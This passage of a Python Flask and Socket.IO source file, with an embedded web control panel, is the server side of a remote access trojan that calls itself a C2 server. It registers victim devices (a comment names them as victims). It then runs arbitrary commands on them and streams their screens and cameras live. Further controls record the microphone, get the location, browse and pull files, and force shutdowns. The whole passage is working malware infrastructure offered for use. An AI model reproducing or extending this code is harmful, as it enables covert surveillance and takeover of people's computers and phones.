                timestamp: new Date().toISOString()
            });
            
            document.getElementById('command-input').value = '';
            showNotification(`Command sent to ${devices[selectedDeviceId]?.hostname || selectedDeviceId}`, 'success');
        }
        
        function sendQuickCommand(command) {
            if (!selectedDeviceId) {
                showNotification('Please select a device first', 'error');
                return;
            }
            
            socket.emit('execute_command', {
                client_id: selectedDeviceId,
                command: command
            });
            
            addToOutput({
                client_id: selectedDeviceId,
                command: command,
                output: 'Command sent...',
                timestamp: new Date().toISOString()
            });
            
            showNotification(`Quick command sent: ${command}`, 'success');
        }
        
        function quickAction(action) {
            if (!selectedDeviceId) {
                showNotification('Please select a device first', 'error');
                return;
            }
            
            const commands = {
                'sysinfo': 'systeminfo',
                'screenshot': 'screenshot',
                'webcam': 'webcam',
                'mic': 'record_mic',
                'location': 'get_location',
                'files': 'explorer'
            };
            
            if (commands[action]) {
                socket.emit('execute_command', {
                    client_id: selectedDeviceId,
                    command: commands[action]
                });
                showNotification(`${action} command sent`, 'success');
            }
        }
        
        // Output management
        function addToOutput(data) {
            const output = document.getElementById('command-output');
            const time = new Date(data.timestamp || Date.now()).toLocaleTimeString();
            
            const entry = document.createElement('div');
            entry.style.marginBottom = '10px';
            entry.style.paddingBottom = '10px';
            entry.style.borderBottom = '1px solid #334477';
            entry.innerHTML = `
                <div style="color:#8888ff;font-size:0.9em;">[${time}] ${data.client_id || 'Unknown'}</div>
                ${data.command ? `<div style="color:#00aaff;margin:5px 0;"><strong>Command:</strong> ${data.command}</div>` : ''}
                <div style="color:#88ff88;font-family:monospace;font-size:0.9em;white-space:pre-wrap;background:rgba(0,0,0,0.5);padding:10px;border-radius:5px;">${data.output || 'No output'}</div>
            `;
            
            output.prepend(entry);
            
            // Auto-scroll
            output.scrollTop = 0;
        }
        
        function clearOutput() {
            document.getElementById('command-output').innerHTML = '';
            showNotification('Output cleared', 'info');
        }
        
        // Advanced controls
        function controlDevice(deviceId) {
            selectDevice(deviceId);
            const device = devices[deviceId];
            const modal = document.getElementById('advanced-modal');
            
            document.getElementById('modal-device-info').innerHTML = `
                <div style="background:rgba(0,30,60,0.5);padding:15px;border-radius:8px;margin-bottom:20px;">
                    <div style="font-weight:bold;color:#88ddff;font-size:1.2em;">
                        ${device.hostname || deviceId}
                    </div>
                    <div style="color:#aaccff;font-size:0.9em;margin-top:5px;">
                        OS: ${device.os || 'Unknown'}<br>
                        User: ${device.username || 'Unknown'}<br>
                        IP: ${device.ip || 'Unknown'}
                    </div>
                </div>
            `;
            
            modal.style.display = 'flex';
        }
        
        function fileOperation(operation) {
            if (!selectedDeviceId) return;
            showNotification(`${operation} operation requested`, 'info');
            // Implementation for file operations would go here
        }
        
        function systemAction(action) {
            if (!selectedDeviceId) return;
            
            const commands = {
                'lock': 'rundll32.exe user32.dll,LockWorkStation',
                'shutdown': 'shutdown /s /t 0',
                'restart': 'shutdown /r /t 0',
                'logout': 'shutdown /l',
                'suspend': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
                'volume': 'nircmd.exe setsysvolume 65535'
            };
            
            if (commands[action]) {
                socket.emit('execute_command', {
                    client_id: selectedDeviceId,
                    command: commands[action]
                });
                showNotification(`${action} command sent`, 'warning');
            }
        }
        
        function surveillanceAction(action) {
            if (!selectedDeviceId) return;
            showNotification(`${action} surveillance started`, 'info');
            // Implementation for surveillance would go here
        }
        
        function closeModal() {
            document.getElementById('advanced-modal').style.display = 'none';
        }
        
        // Utility functions
        function showNotification(message, type) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = `notification ${type}`;
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }
        
        function updateConnectionStatus(status) {
            const dot = document.getElementById('connection-dot');
            const text = document.getElementById('connection-status');
            
            if (status === 'connected') {
                dot.className = 'status-dot online';
                text.textContent = 'Connected';
            } else {
                dot.className = 'status-dot offline';
                text.textContent = 'Disconnected';
            }
        }
        
        function updateStreamStatus(data) {
            const dot = document.getElementById('stream-dot');
            const text = document.getElementById('stream-status');
            
            if (data.active) {
                dot.className = 'status-dot online';
                text.textContent = `${data.stream_type} Stream: ${data.status}`;
            } else {
                dot.className = 'status-dot offline';
                text.textContent = 'No Stream';
            }
        }
        
        function updateStreamDot(status) {
            const dot = document.getElementById('stream-dot');
            if (status === 'active') {
                dot.className = 'status-dot online';
                document.getElementById('stream-status').textContent = 'Stream Active';
            }
        }
        
        function updateStats() {
            const onlineDevices = Object.values(devices).filter(d => d.online).length;
            const totalDevices = Object.keys(devices).length;
            const activeStreams = (screenStreamActive ? 1 : 0) + (cameraStreamActive ? 1 : 0);
            
            document.getElementById('total-devices').textContent = totalDevices;
            document.getElementById('online-devices').textContent = onlineDevices;
            document.getElementById('total-streams').textContent = activeStreams;
            document.getElementById('device-count').textContent = `${onlineDevices} Devices`;
            
            // Update uptime
            const uptime = Math.floor((Date.now() - serverStartTime) / 1000);
            const hours = Math.floor(uptime / 3600);
            const minutes = Math.floor((uptime % 3600) / 60);
            const seconds = uptime % 60;
            document.getElementById('uptime').textContent = `${hours}h ${minutes}m`;
        }
        
        function toggleFullscreen() {
            const elem = document.getElementById('live-display');
            if (!document.fullscreenElement) {
                elem.requestFullscreen().catch(err => {
                    showNotification(`Fullscreen error: ${err.message}`, 'error');
                });
            } else {
                document.exitFullscreen();
            }
        }
        
        function handleFileTransfer(data) {
            if (data.type === 'download') {
                // Create download link
                const link = document.createElement('a');
                link.href = 'data:application/octet-stream;base64,' + data.data;
                link.download = data.filename;
                link.click();
                showNotification(`File downloaded: ${data.filename}`, 'success');
            }
        }
        
        // Initialize
        window.onload = function() {
            initWebSocket();
            
            // Update stats every 3 seconds
            setInterval(updateStats, 3000);
            
            // Auto-refresh devices every 10 seconds
            setInterval(refreshDevices, 10000);
            
            // Handle keyboard shortcuts
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Escape') closeModal();
                if (e.key === 'F11') toggleFullscreen();
                if (e.ctrlKey && e.key === 'k') {
                    e.preventDefault();
                    document.getElementById('command-input').focus();
                }
                if (e.ctrlKey && e.key === 'l') {
                    e.preventDefault();
                    clearOutput();
                }
            });
        };
    </script>
</body>
</html>
""")

# ============= API ROUTES =============

@app.route('/api/clients')
def api_clients():
    """Get all clients"""
    client_list = []
    for client_id, client in clients.items():
        client_list.append({
            'client_id': client_id,
            'hostname': client.get('hostname', 'Unknown'),
            'username': client.get('username', 'Unknown'),
            'os': client.get('os', 'Unknown'),
            'platform': client.get('platform', 'Unknown'),
            'ip': client.get('ip', 'Unknown'),
            'online': client.get('online', False),
            'last_seen': client.get('last_seen', 0)
        })
    return jsonify(client_list)

@app.route('/api/stream/start', methods=['POST'])
def api_start_stream():
    """Start screen/camera stream"""
    data = request.get_json()
    client_id = data.get('client_id')
    stream_type = data.get('type', 'screen')
    quality = data.get('quality', 'medium')
    fps = data.get('fps', 15)
    
    if client_id not in clients:
        return jsonify({'error': 'Client not found'}), 404
    
    if stream_type == 'screen':
        screen_streams[client_id] = {'active': True, 'quality': quality, 'fps': fps}
        # Send start command to client
        if client_id in client_sockets:
            socketio.emit('command', {
                'id': f'stream_{int(time.time())}',
                'type': 'start_screen_stream',
                'quality': quality,
                'fps': fps
            }, room=client_sockets[client_id])
    elif stream_type == 'camera':
        camera_streams[client_id] = {'active': True, 'camera_id': data.get('camera_id', 0), 'quality': quality, 'fps': fps}
        if client_id in client_sockets:
            socketio.emit('command', {
                'id': f'camera_{int(time.time())}',
                'type': 'start_camera_stream',
                'camera_id': data.get('camera_id', 0),
                'quality': quality,
                'fps': fps
            }, room=client_sockets[client_id])
    
    return jsonify({'status': 'started', 'stream_type': stream_type})

@app.route('/api/stream/stop', methods=['POST'])
def api_stop_stream():
    """Stop screen/camera stream"""
    data = request.get_json()
    client_id = data.get('client_id')
    stream_type = data.get('type', 'screen')
    
    if stream_type == 'screen' and client_id in screen_streams:
        screen_streams[client_id]['active'] = False
        if client_id in client_sockets:
            socketio.emit('command', {
                'id': f'stop_{int(time.time())}',
                'type': 'stop_screen_stream'
            }, room=client_sockets[client_id])
    elif stream_type == 'camera' and client_id in camera_streams:
        camera_streams[client_id]['active'] = False
        if client_id in client_sockets:
            socketio.emit('command', {
                'id': f'stop_{int(time.time())}',
                'type': 'stop_camera_stream'
            }, room=client_sockets[client_id])
    
    return jsonify({'status': 'stopped'})

# ============= SOCKET.IO EVENTS =============

@socketio.on('connect')
def handle_connect():
    logger.info(f"[+] New connection: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    # Check if it's a controller
    if request.sid in connected_controllers:
        connected_controllers.remove(request.sid)
        logger.info(f"[-] Controller disconnected: {request.sid}")
        return
    
    # Check if it's a client
    for client_id, socket_id in list(client_sockets.items()):
        if socket_id == request.sid:
            if client_id in clients:
                clients[client_id]['online'] = False
                clients[client_id]['last_seen'] = time.time()
            
            # Stop any active streams
            if client_id in screen_streams:
                screen_streams[client_id]['active'] = False
            if client_id in camera_streams:
                camera_streams[client_id]['active'] = False
            
            del client_sockets[client_id]
            logger.info(f"[-] Client disconnected: {client_id}")
            
            # Notify all controllers
            socketio.emit('client_offline', {'client_id': client_id})
            break

@socketio.on('controller_connect')
def handle_controller_connect():
    """Web controller connects"""
    connected_controllers.add(request.sid)
    logger.info(f"[+] Web controller connected: {request.sid}")
    
    # Send current client list
    for client_id, client in clients.items():
        if client.get('online', False):
            socketio.emit('client_online', {
                'client_id': client_id,
                'hostname': client.get('hostname', 'Unknown'),
                'username': client.get('username', 'Unknown'),
                'os': client.get('os', 'Unknown'),
                'platform': client.get('platform', 'Unknown'),
                'ip': client.get('ip', 'Unknown'),
                'online': True
            }, room=request.sid)
    
    emit('controller_ready', {'message': 'Connected to C2 server'})

@socketio.on('get_devices')
def handle_get_devices():
    """Send device list to controller"""
    for client_id, client in clients.items():
        emit('client_online', {
            'client_id': client_id,
            'hostname': client.get('hostname', 'Unknown'),
            'username': client.get('username', 'Unknown'),
            'os': client.get('os', 'Unknown'),
            'platform': client.get('platform', 'Unknown'),
            'ip': client.get('ip', 'Unknown'),
            'online': client.get('online', False)
        })

@socketio.on('execute_command')
def handle_execute_command(data):
    """Execute command from web interface"""
    client_id = data.get('client_id')
    command = data.get('command')
    
    if client_id in client_sockets:
        cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
        cmd_obj = {
            'id': cmd_id,
            'command': command,
            'timestamp': time.time(),
            'status': 'pending'
        }
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        emit('command_sent', {'command_id': cmd_id, 'client_id': client_id})
    else:
        emit('command_error', {'error': 'Client offline', 'client_id': client_id})

@socketio.on('start_screen_stream')
def handle_start_screen_stream(data):
    """Start screen stream"""
    client_id = data.get('client_id')
    quality = data.get('quality', 'medium')
    fps = data.get('fps', 15)
    
    if client_id in client_sockets:
        screen_streams[client_id] = {'active': True, 'quality': quality, 'fps': fps}
        socketio.emit('command', {
            'id': f'stream_start_{int(time.time())}',
            'type': 'start_screen_stream',
            'quality': quality,
            'fps': fps
        }, room=client_sockets[client_id])
        emit('stream_status', {
            'client_id': client_id,
            'stream_type': 'screen',
            'status': 'starting',
            'active': True
        })
        logger.info(f"[🎬] Starting screen stream for {client_id} (Quality: {quality}, FPS: {fps})")

@socketio.on('stop_screen_stream')
def handle_stop_screen_stream(data):
    """Stop screen stream"""
    client_id = data.get('client_id')
    if client_id in screen_streams:
        screen_streams[client_id]['active'] = False
        if client_id in client_sockets:
            socketio.emit('command', {
                'id': f'stream_stop_{int(time.time())}',
                'type': 'stop_screen_stream'
            }, room=client_sockets[client_id])
        emit('stream_status', {
            'client_id': client_id,
            'stream_type': 'screen',
            'status': 'stopped',
            'active': False
        })
        logger.info(f"[🎬] Stopping screen stream for {client_id}")

@socketio.on('start_camera_stream')
def handle_start_camera_stream(data):
    """Start camera stream"""
    client_id = data.get('client_id')
    quality = data.get('quality', 'medium')
    fps = data.get('fps', 15)
    camera_id = data.get('camera_id', 0)
    
    if client_id in client_sockets:
        camera_streams[client_id] = {'active': True, 'camera_id': camera_id, 'quality': quality, 'fps': fps}
        socketio.emit('command', {
            'id': f'camera_start_{int(time.time())}',
            'type': 'start_camera_stream',
            'camera_id': camera_id,
            'quality': quality,
            'fps': fps
        }, room=client_sockets[client_id])
        emit('stream_status', {
            'client_id': client_id,
            'stream_type': 'camera',
            'status': 'starting',
            'active': True
        })
        logger.info(f"[📷] Starting camera stream for {client_id} (Camera: {camera_id})")

@socketio.on('stop_camera_stream')
def handle_stop_camera_stream(data):
    """Stop camera stream"""
    client_id = data.get('client_id')
    if client_id in camera_streams:
        camera_streams[client_id]['active'] = False
        if client_id in client_sockets:
            socketio.emit('command', {
                'id': f'camera_stop_{int(time.time())}',
                'type': 'stop_camera_stream'
            }, room=client_sockets[client_id])
        emit('stream_status', {
            'client_id': client_id,
            'stream_type': 'camera',
            'status': 'stopped',
            'active': False
        })
        logger.info(f"[📷] Stopping camera stream for {client_id}")

@socketio.on('update_stream_settings')
def handle_update_stream_settings(data):
    """Update stream settings"""
    client_id = data.get('client_id')
    stream_type = data.get('stream_type', 'screen')
    quality = data.get('quality')
    fps = data.get('fps')
    
    if stream_type == 'screen' and client_id in screen_streams:
        if quality: screen_streams[client_id]['quality'] = quality
        if fps: screen_streams[client_id]['fps'] = fps
        if client_id in client_sockets:
            socketio.emit('command', {
                'id': f'update_{int(time.time())}',
                'type': 'update_stream_settings',
                'stream_type': 'screen',
                'quality': quality,
                'fps': fps
            }, room=client_sockets[client_id])
    elif stream_type == 'camera' and client_id in camera_streams:
        if quality: camera_streams[client_id]['quality'] = quality
        if fps: camera_streams[client_id]['fps'] = fps
        if client_id in client_sockets:
            socketio.emit('command', {
                'id': f'update_{int(time.time())}',
                'type': 'update_stream_settings',
                'stream_type': 'camera',
                'quality': quality,
                'fps': fps
            }, room=client_sockets[client_id])

@socketio.on('register')
def handle_register(data):
    """Client (victim) registers with server"""
    client_id = data.get('id')
    
    if not client_id:
        # Generate unique ID
        unique = f"{data.get('hostname', '')}{data.get('username', '')}{data.get('os', '')}{time.time()}"
        client_id = hashlib.sha256(unique.encode()).hexdigest()[:16]
    
    # Store client info
    clients[client_id] = {
        'id': client_id,
        'hostname': data.get('hostname', 'Unknown'),
        'username': data.get('username', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'platform': data.get('platform', 'Unknown'),
        'device_type': data.get('device_type', 'desktop'),  # desktop, android, ios
        'ip': request.remote_addr,
        'online': True,
        'first_seen': time.time(),
        'last_seen': time.time(),
        'capabilities': data.get('capabilities', [])  # screen, camera, mic, etc.
    }
    
    # Map socket to client
    client_sockets[client_id] = request.sid
    join_room(client_id)
    
    logger.info(f"[+] Client registered: {client_id} - {data.get('hostname')} ({data.get('platform')})")
    
    # Send welcome
    emit('welcome', {
        'client_id': client_id,
        'message': 'Connected to C2 Server',
        'timestamp': time.time(),
        'server_time': time.time()
    })
    
    # Notify all controllers
    socketio.emit('client_online', {
        'client_id': client_id,
        'hostname': data.get('hostname'),
        'username': data.get('username'),
        'os': data.get('os'),
        'platform': data.get('platform'),
        'device_type': data.get('device_type', 'desktop'),
        'ip': request.remote_addr,
        'online': True,
        'capabilities': data.get('capabilities', [])
    })
    
    # Send any pending commands
    if client_id in pending_commands and pending_commands[client_id]:
        for cmd in pending_commands[client_id]:
            emit('command', cmd)
        pending_commands[client_id].clear()

@socketio.on('heartbeat')
def handle_heartbeat(data):
    """Client heartbeat"""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        clients[client_id]['last_seen'] = time.time()
        clients[client_id]['online'] = True
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('result')
def handle_result(data):
    """Command result from client"""
    cmd_id = data.get('command_id')
    client_id = data.get('client_id')
    
    logger.info(f"[*] Result from {client_id}: {data.get('command', 'Unknown')[:50]}...")
    
    # Store result
    result_data = {
        'command_id': cmd_id,
        'client_id': client_id,
        'command': data.get('command', ''),
        'output': data.get('output', ''),
        'success': data.get('success', True),
        'status': 'completed',
        'timestamp': time.time()
    }
    
    # Save to file
    try:
        with open(f'logs/result_{cmd_id}.json', 'w') as f:
            json.dump(result_data, f)
    except:
        pass
    
    # Forward to all controllers
    socketio.emit('command_result', result_data)

@socketio.on('screen_frame')
def handle_screen_frame(data):
    """Screen frame from client"""
    client_id = data.get('client_id')
    frame_data = data.get('frame')
    quality = data.get('quality', 'medium')
    
    if client_id in screen_streams and screen_streams[client_id]['active']:
        # Store last frame
        live_screens[client_id] = {
            'frame': frame_data,
            'timestamp': time.time(),
            'quality': quality
        }
        
        # Forward to controllers watching this client
        socketio.emit('screen_frame', {
            'client_id': client_id,
            'frame': frame_data,
            'quality': quality,
            'timestamp': time.time(),
            'size': len(frame_data) if frame_data else 0
        })

@socketio.on('camera_frame')
def handle_camera_frame(data):
    """Camera frame from client"""
    client_id = data.get('client_id')
    frame_data = data.get('frame')
    camera_id = data.get('camera_id', 0)
    quality = data.get('quality', 'medium')
    
    if client_id in camera_streams and camera_streams[client_id]['active']:
        # Store last frame
        live_cameras[client_id] = {
            'frame': frame_data,
            'camera_id': camera_id,
            'timestamp': time.time(),
            'quality': quality
        }
        
        # Forward to controllers watching this client
        socketio.emit('camera_frame', {
            'client_id': client_id,
            'frame': frame_data,
            'camera_id': camera_id,
            'quality': quality,
            'timestamp': time.time(),
            'size': len(frame_data) if frame_data else 0
        })

@socketio.on('file_transfer')
def handle_file_transfer(data):
    """File transfer from client"""
    socketio.emit('file_transfer', data)

@socketio.on('alert')
def handle_alert(data):
    """Alert from client"""
    logger.warning(f"[⚠️] Alert from {data.get('client_id')}: {data.get('message')}")
    socketio.emit('alert', data)

# ============= CLEANUP THREAD =============

def cleanup_thread():
    """Cleanup old data and check connections"""
    while True:
        try:
            # Mark inactive clients as offline
            cutoff = time.time() - 120  # 2 minutes
            for client_id, client in list(clients.items()):
                if client.get('last_seen', 0) < cutoff and client.get('online', False):
                    clients[client_id]['online'] = False
                    
                    # Stop streams
                    if client_id in screen_streams:
                        screen_streams[client_id]['active'] = False
                    if client_id in camera_streams:
                        camera_streams[client_id]['active'] = False
                    
                    socketio.emit('client_offline', {'client_id': client_id})
                    logger.info(f"[!] Marked {client_id} as offline (inactive)")
            
            # Clean old data
            cutoff_time = time.time() - (3 * 86400)  # 3 days
            for folder in ['logs', 'screenshots', 'videos', 'camera', 'downloads', 'uploads']:
                if os.path.exists(folder):
                    for filename in os.listdir(folder):
                        filepath = os.path.join(folder, filename)
                        if os.path.isfile(filepath):
                            if os.path.getmtime(filepath) < cutoff_time:
                                try:
                                    os.remove(filepath)
                                except:
                                    pass
            
            time.sleep(60)  # Run every minute
            
        except Exception as e:
            logger.error(f"[!] Cleanup error: {e}")
            time.sleep(60)

# Start cleanup thread
threading.Thread(target=cleanup_thread, daemon=True).start()

# ============= MAIN =============

def main():
    port = int(os.environ.get('PORT', 5000))
    
    print(f"[*] Starting C2 Real-Time Screen & Camera Viewer")
    print(f"[*] Web Interface: http://0.0.0.0:{port}")
    print(f"[*] WebSocket: ws://0.0.0.0:{port}/socket.io")
    print(f"[*] Features:")
    print(f"    ✓ Live Screen Sharing (Real-time)")
    print(f"    ✓ Camera Streaming (Front/Back)")
    print(f"    ✓ Android & Windows Support")
    print(f"    ✓ Quality Control (Low/Medium/High)")
    print(f"    ✓ FPS Control (5/15/30 FPS)")
    print(f"    ✓ Fullscreen Mode")
    print(f"    ✓ Remote Command Execution")
    print(f"    ✓ File Transfer")
    print()
    print(f"[*] Access from any browser - No console needed!")
    print()
    
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)

if __name__ == '__main__':
    main()
